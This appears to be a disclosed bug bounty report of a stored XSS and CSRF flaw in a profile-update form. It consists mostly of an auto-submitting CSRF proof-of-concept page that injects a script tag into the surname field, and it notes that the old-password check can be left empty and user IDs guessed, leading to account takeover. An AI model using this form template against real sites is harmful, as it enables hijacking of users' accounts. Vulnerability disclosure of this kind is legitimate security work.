# Stored XSS + CSRF in "apellido" value

## Report Details
- **Report ID**: 2037234
- **URL**: https://hackerone.com/reports/2037234
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2023-06-24T15:42:26.489Z
- **Disclosed**: 2023-08-30T15:47:16.819Z

## Reporter
- **Username**: never_die
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: mars

## Vulnerability Information
## Summary:
Hi team,

## Steps To Reproduce:
[add details for how we can reproduce the issue]

This is my CSRF POC: 
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="██████" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="nombre" value="aaaaaaaaaaaaaaaa" />
      <input type="hidden" name="apellido" value="<script>alert()</script>" />
      <input type="hidden" name="email" value="weqwad&#64;intigriti&#46;me" />
      <input type="hidden" name="rut" value="" />
      <input type="hidden" name="idProvincia" value="15" />
      <input type="hidden" name="idLocalidad" value="0" />
      <input type="hidden" name="optin&#91;usuario&#95;info&#95;miroyalcanin&#93;" value="no" />
      <input type="hidden" name="optin&#91;usuario&#95;info&#95;miroyalcanin&#93;" value="si" />
      <input type="hidden" name="optin&#91;usuario&#95;info&#95;marspetcare&#93;" value="no" />
      <input type="hidden" name="optin&#91;usuario&#95;info&#95;marspetcare&#93;" value="si" />
      <input type="hidden" name="optin&#91;usuario&#95;investigaciones&#93;" value="no" />
      <input type="hidden" name="optin&#91;usuario&#95;investigaciones&#93;" value="si" />
      <input type="hidden" name="optin&#91;usuario&#95;info&#95;perros&#93;" value="no" />
      <input type="hidden" name="optin&#91;usuario&#95;info&#95;perros&#93;" value="si" />
      <input type="hidden" name="optin&#91;usuario&#95;info&#95;gatos&#93;" value="no" />
      <input type="hidden" name="optin&#91;usuario&#95;info&#95;gatos&#93;" value="si" />
      <input type="hidden" name="switch&#95;pass" value="off" />
      <input type="hidden" name="ck&#95;oldpass" value="" />
      <input type="hidden" name="oldpass" value="" />
      <input type="hidden" name="clave" value="" />
      <input type="hidden" name="clave2" value="" />
      <input type="hidden" name="idUsuario" value="91737" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

### The "oldpass" value can empty to bypass:))
### The "idUsuario" value requirement can guess!!!

### impact:
Account Takeover


## Attachments
No attachments
